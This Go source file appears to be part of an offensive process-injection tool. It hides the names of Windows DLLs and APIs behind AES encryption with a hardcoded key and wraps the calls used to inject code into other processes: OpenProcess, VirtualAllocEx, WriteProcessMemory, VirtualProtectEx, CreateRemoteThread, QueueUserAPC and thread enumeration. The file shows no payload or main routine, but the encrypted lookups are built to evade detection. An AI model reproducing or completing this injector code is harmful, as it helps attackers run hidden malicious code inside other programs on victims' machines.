package main

import "syscall"
import "unsafe"

var ntdll_str string = GetAESDecrypted_aux("FMLM8FlzhmCRhwLeS8VUSg==", "N33dl3N33dl3N33dl3N33dl3N33dl333", "N33dl3N33dl3N33d")
var psapi_str string = GetAESDecrypted_aux("Cb84zuSGizGgrwF7p5Fm/A==", "N33dl3N33dl3N33dl3N33dl3N33dl333", "N33dl3N33dl3N33d")
var kernel32_str string = GetAESDecrypted_aux("MJQjMjHPudxM3blox+ys0g==", "N33dl3N33dl3N33dl3N33dl3N33dl333", "N33dl3N33dl3N33d")

var NGNP_str string = GetAESDecrypted_aux("zze7aKIbFOm/HFKA2R9AtA==", "N33dl3N33dl3N33dl3N33dl3N33dl333", "N33dl3N33dl3N33d")
var GPIFNA_str string = GetAESDecrypted_aux("Zmd7d9pcACTTRmHZ5UfBDL/+dV4ng9TRvlBDjAQL+SI=", "N33dl3N33dl3N33dl3N33dl3N33dl333", "N33dl3N33dl3N33d")
var GPI_str string = GetAESDecrypted_aux("yxRxIdBiBeTxdRHNMcW36Q==", "N33dl3N33dl3N33dl3N33dl3N33dl333", "N33dl3N33dl3N33d")
var CRT_str string = GetAESDecrypted_aux("pUYSimsZdRtLMhNUecURSH9LA4htjsY31IYSAcIrNpg=", "N33dl3N33dl3N33dl3N33dl3N33dl333", "N33dl3N33dl3N33d")
var VPE_str string = GetAESDecrypted_aux("PGIA5riJwMfIjFziWNI0RQ==", "N33dl3N33dl3N33dl3N33dl3N33dl333", "N33dl3N33dl3N33d")
var RT_str string = GetAESDecrypted_aux("offIRQjSOTbThwx44UAPmw==", "N33dl3N33dl3N33dl3N33dl3N33dl333", "N33dl3N33dl3N33d")
var OP_str string = GetAESDecrypted_aux("gIlbTUZa1e0bt0CSDYZmWg==", "N33dl3N33dl3N33dl3N33dl3N33dl333", "N33dl3N33dl3N33d")
var VAEx_str string = GetAESDecrypted_aux("b5RzbWx3Cn/kpPlDbFFPOg==", "N33dl3N33dl3N33dl3N33dl3N33dl333", "N33dl3N33dl3N33d")
var WPM_str string = GetAESDecrypted_aux("b5Iyb3wpHNmw/Mk6KxIZqx3hyYItOdGFEIb5ul1+SZM=", "N33dl3N33dl3N33dl3N33dl3N33dl333", "N33dl3N33dl3N33d")
var T32F_str string = GetAESDecrypted_aux("BmhaMwsSyepIOR76IQkRsg==", "N33dl3N33dl3N33dl3N33dl3N33dl333", "N33dl3N33dl3N33d")
var T32N_str string = GetAESDecrypted_aux("rzofm4pRigZyEIPNe32/iA==", "N33dl3N33dl3N33dl3N33dl3N33dl333", "N33dl3N33dl3N33d")
var OT_str string = GetAESDecrypted_aux("d2rGOn2S1EsrYl+GQfh5UQ==", "N33dl3N33dl3N33dl3N33dl3N33dl333", "N33dl3N33dl3N33d")
var QUAPC_str string = GetAESDecrypted_aux("jr1ldiiDZqkXSxn0PTnjPg==", "N33dl3N33dl3N33dl3N33dl3N33dl333", "N33dl3N33dl3N33d")
var CH_str string = GetAESDecrypted_aux("I9BzKP3vnDqJJPYVcV38dw==", "N33dl3N33dl3N33dl3N33dl3N33dl333", "N33dl3N33dl3N33d")
var CPA_str string = GetAESDecrypted_aux("vh75BCTVuMcYSGVlPwepdw==", "N33dl3N33dl3N33dl3N33dl3N33dl333", "N33dl3N33dl3N33d")
var CT32S_str string = GetAESDecrypted_aux("g/n9hfw7niVL7CLsh41CgpePOByTTsFMxU2f+AeHxtE=", "N33dl3N33dl3N33dl3N33dl3N33dl333", "N33dl3N33dl3N33d")

///////////////
// Structs ///
///////////////

type ThreadEntry32 struct {
   Size           uint32
   tUsage         uint32
   ThreadID       uint32
   OwnerProcessID uint32
   BasePri        int32
   DeltaPri       int32
   Flags          uint32
}


type StartupInfo struct {
    Cb uint32

    Desktop       *uint16
    Title         *uint16
    X             uint32
    Y             uint32
    XSize         uint32
    YSize         uint32
    XCountChars   uint32
    YCountChars   uint32
    FillAttribute uint32
    Flags         uint32
    ShowWindow    uint16

    StdInput  uintptr
    StdOutput uintptr
    StdErr    uintptr
    // contains filtered or unexported fields
}


type ProcessInformation struct {
    Process   uintptr
    Thread    uintptr
    ProcessId uint32
    ThreadId  uint32
}


///////////////
// API calls //
///////////////

func NGNP(handle uintptr, MAX_ALLOWED int, param3 int, param4 int, outHandle uintptr) uintptr {
   ret, _, _ := syscall.NewLazyDLL(ntdll_str).NewProc(NGNP_str).Call(
      uintptr(handle),
      uintptr(MAX_ALLOWED),
      uintptr(param3),
      uintptr(param4),
      uintptr(outHandle),
   )
   return uintptr(ret)
}


func GPIFN(hProcess uintptr, lpImageFileName uintptr, nSize int) uintptr {
   ret, _, _ := syscall.NewLazyDLL(psapi_str).NewProc(GPIFNA_str).Call(
      uintptr(hProcess),
      uintptr(lpImageFileName),
      uintptr(nSize),
   )
   return uintptr(ret)
}


func GPI(handle uintptr) uintptr {
   ret, _, _ := syscall.NewLazyDLL(kernel32_str).NewProc(GPI_str).Call(
      uintptr(handle),
   )
   return uintptr(ret)
}


func CRT(hProcess uintptr, lpThreadAttributes uintptr, dwStackSize uint64, lpStartAddress uintptr, lpParameter uintptr, dwCreationFlags uint32, lpThreadId uint32) uintptr {
   ret, _, _ := syscall.NewLazyDLL(kernel32_str).NewProc(CRT_str).Call(
      uintptr(hProcess),
      uintptr(lpThreadAttributes),
      uintptr(dwStackSize),
      uintptr(lpStartAddress),
      uintptr(lpParameter),
      uintptr(dwCreationFlags),
      uintptr(lpThreadId),      
   )
   return uintptr(ret)
}


func VPE(hProcess uintptr, lpAddress uintptr, dwSize uintptr, flNewProtect uintptr, lpflOldProtect uintptr) uintptr {
   ret, _, _ := syscall.NewLazyDLL(kernel32_str).NewProc(VPE_str).Call(
      uintptr(hProcess),
      uintptr(lpAddress),
      uintptr(dwSize),
      uintptr(flNewProtect),
      uintptr(lpflOldProtect),
   )
   return uintptr(ret)
}


func RT(hProcess uintptr) uintptr {
   ret, _, _ := syscall.NewLazyDLL(kernel32_str).NewProc(RT_str).Call(
      uintptr(hProcess),
   )
   return uintptr(ret)
}


func OP(processAccess int, bInheritHandle int, processId uintptr) uintptr {
   ret, _, _ := syscall.NewLazyDLL(kernel32_str).NewProc(OP_str).Call(
      uintptr(processAccess),
      uintptr(bInheritHandle),
      uintptr(processId),
   )
   return uintptr(ret)
}


func VAEx(hProcess uintptr, lpAddress uintptr, dwSize uintptr, flAllocationType uint, flProtect uint) uintptr {
   ret, _, _ := syscall.NewLazyDLL(kernel32_str).NewProc(VAEx_str).Call(
      uintptr(hProcess),
      uintptr(lpAddress),
      uintptr(dwSize),
      uintptr(flAllocationType),
      uintptr(flProtect),
   )
   return uintptr(ret)
}


func WPM(hProcess uintptr, lpAddress uintptr, lpBuffer uintptr, nSize uintptr) uintptr {
   ret, _, _ := syscall.NewLazyDLL(kernel32_str).NewProc(WPM_str).Call(
      uintptr(hProcess),
      uintptr(lpAddress),
      uintptr(lpBuffer),
      uintptr(nSize),
   )
   return uintptr(ret)
}


func T32F(hSnapshot uintptr, lpte uintptr) uintptr {
   ret, _, _ := syscall.NewLazyDLL(kernel32_str).NewProc(T32F_str).Call(
      uintptr(hSnapshot),
      uintptr(lpte),
   )
   return uintptr(ret)
}


func T32N(hSnapshot uintptr, lpte uintptr) uintptr {
   ret, _, _ := syscall.NewLazyDLL(kernel32_str).NewProc(T32N_str).Call(
      uintptr(hSnapshot),
      uintptr(lpte),
   )
   return uintptr(ret)
}


func OT(dwDesiredAccess uint, bInheritHandle int, dwThreadId uint32) uintptr {
   ret, _, _ := syscall.NewLazyDLL(kernel32_str).NewProc(OT_str).Call(
      uintptr(dwDesiredAccess),
      uintptr(bInheritHandle),
      uintptr(dwThreadId),
   )
   return uintptr(ret)
}


func QUAPC(pfnAPC uintptr, hThread uintptr, dwData uintptr) uintptr {
   ret, _, _ := syscall.NewLazyDLL(kernel32_str).NewProc(QUAPC_str).Call(
      uintptr(pfnAPC),
      uintptr(hThread),
      uintptr(dwData),
   )
   return uintptr(ret)
}


func CH(hProcess uintptr) uintptr {
   ret, _, _ := syscall.NewLazyDLL(kernel32_str).NewProc(CH_str).Call(
      uintptr(hProcess),
   )
   return uintptr(ret)
}


func CPA(lpApplicationName uintptr, lpCommandLine uintptr, lpProcessAttributes uintptr, lpThreadAttributes uintptr, bInheritHandles uint32, dwCreationFlags uint32, lpEnvironment uintptr,  lpCurrentDirectory uintptr, lpStartupInfo uintptr, lpProcessInformation uintptr) uintptr {
   ret, _, _ := syscall.NewLazyDLL(kernel32_str).NewProc(CPA_str).Call(
      uintptr(lpApplicationName),
      uintptr(lpCommandLine),
      uintptr(lpProcessAttributes),
      uintptr(lpThreadAttributes),
      uintptr(bInheritHandles),
      uintptr(dwCreationFlags),
      uintptr(lpEnvironment),
      uintptr(lpCurrentDirectory),
      uintptr(lpStartupInfo),
      uintptr(lpProcessInformation),

   )
   return uintptr(ret)
}


func CT32S(dwFlags uintptr, th32ProcessID uint) uintptr {
   ret, _, _ := syscall.NewLazyDLL(kernel32_str).NewProc(CT32S_str).Call(
      uintptr(dwFlags),
      uintptr(th32ProcessID),
   )
   return uintptr(ret)
}


///////////////
//// Other ////
///////////////

func GetThreads(pid uintptr) []uint32 {
   var thread_ids_slice []uint32;
   var snapshot uintptr = CT32S(0x00000004, 0);
   

   var te ThreadEntry32;
   te.Size = uint32(unsafe.Sizeof(te));
   T32F(uintptr(snapshot), uintptr(unsafe.Pointer(&te)));
 
   for{

      if (T32N(uintptr(snapshot), uintptr(unsafe.Pointer(&te))) == 0) { break }
      if (te.OwnerProcessID == uint32(pid)){
         thread_ids_slice = append(thread_ids_slice, te.ThreadID)
      }
   }
   CH(uintptr(snapshot));
   return thread_ids_slice;
}


// Source: https://medium.com/@justen.walker/breaking-all-the-rules-using-go-to-call-windows-api-2cbfd8c79724
func StringToCharPtr(str string) *uint8 {
   chars := append([]byte(str), 0) // null terminated
   return &chars[0]
}